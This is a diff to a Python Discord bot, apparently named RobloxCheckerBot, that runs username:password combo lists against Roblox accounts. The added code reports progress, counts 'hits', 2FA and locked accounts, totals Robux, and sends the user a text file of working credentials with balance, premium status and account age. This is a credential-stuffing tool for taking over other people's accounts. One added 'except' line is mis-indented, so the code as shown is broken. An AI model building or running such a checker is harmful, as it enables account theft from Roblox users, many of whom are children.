@@ -42,7 +42,6 @@ class RobloxCheckerBot(commands.Bot):
     async def on_ready(self):
         activity = discord.Activity(type=discord.ActivityType.watching, name="Roblox Accounts")
         await self.change_presence(activity=activity)
-
 bot = RobloxCheckerBot()
 
 @bot.tree.command(name="check", description="Check Roblox Accounts aus Combo-Liste")
@@ -257,3 +256,87 @@ async def get_account_details(session, result, user_id, proxy):
                     created_date = datetime.fromisoformat(created.replace("Z", "+00:00"))
                     age_days = (datetime.now() - created_date.replace(tzinfo=None)).days
                     result["account_age"] = age_days
+except Exception as e:
+        print(f"Details error: {e}")
+
+async def update_progress_embed(message, check_id):
+    data = bot.active_checks[check_id]
+    
+    embed = discord.Embed(
+        title="🔍 Roblox Account Checker - Running",
+        color=discord.Color.blue(),
+        timestamp=datetime.now()
+    )
+    
+    progress = data["checked"] / data["total"] * 100
+    bar = "█" * int(progress / 10) + "░" * (10 - int(progress / 10))
+    
+    embed.add_field(
+        name="⏳ Progress",
+        value=f"`{bar}` {progress:.1f}%\n{data['checked']}/{data['total']}",
+        inline=False
+    )
+    embed.add_field(name="✅ Hits", value=f"`{data['hits']}`", inline=True)
+    embed.add_field(name="🔒 2FA", value=f"`{data['twofa']}`", inline=True)
+    embed.add_field(name="⛔ Locked", value=f"`{data['locked']}`", inline=True)
+    embed.add_field(name="💰 Total Robux", value=f"`{data['robux_total']}`", inline=True)
+    
+    try:
+        await message.edit(embed=embed)
+    except:
+        pass
+
+async def send_final_results(message, check_id, user):
+    data = bot.active_checks[check_id]
+    
+    embed = discord.Embed(
+        title="✅ Check Complete!",
+        description=f"Checked `{data['checked']}` accounts",
+        color=discord.Color.green(),
+        timestamp=datetime.now()
+    )
+    
+    embed.add_field(name="✅ Hits", value=f"`{data['hits']}`", inline=True)
+    embed.add_field(name="🔒 2FA", value=f"`{data['twofa']}`", inline=True)
+    embed.add_field(name="⛔ Locked", value=f"`{data['locked']}`", inline=True)
+    
+    if data["hits"] > 0:
+        avg_robux = data['robux_total'] // data['hits'] if data['hits'] > 0 else 0
+        embed.add_field(name="💰 Total Robux", value=f"`{data['robux_total']}`", inline=True)
+        embed.add_field(name="📊 Avg/Hits", value=f"`{avg_robux}`", inline=True)
+    
+    await message.edit(embed=embed)
+    
+    # Sende Hits als Datei
+    if data["results"]:
+        hits_text = ""
+        for hit in data["results"]:
+            line = f"{hit['username']}:{hit['password']} | ID: {hit.get('user_id')} | Robux: {hit.get('robux', 0)}"
+            if hit.get('premium'):
+                line += " | ⭐PREMIUM"
+            if hit.get('account_age'):
+                line += f" | Age: {hit['account_age']}d"
+            hits_text += line + "\n"
+        
+        filename = f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        async with aiofiles.open(filename, 'w') as f:
+            await f.write(hits_text)
+        
+        try:
+            await user.send(
+                content=f"🎉 **{data['hits']} Hits gefunden!**",
+                file=discord.File(filename)
+            )
+            await message.reply(f"📩 Ergebnisse per DM gesendet!")
+        except:
+            await message.reply(
+                content=f"⚠️ Could not DM. Hier sind die Hits:",
+                file=discord.File(filename)
+            )
+        
+        os.remove(filename)
+
+# Start
+TOKEN = os.environ['DISCORD_TOKEN']  # Für Railway
+keep_alive()
+bot.run(TOKEN)
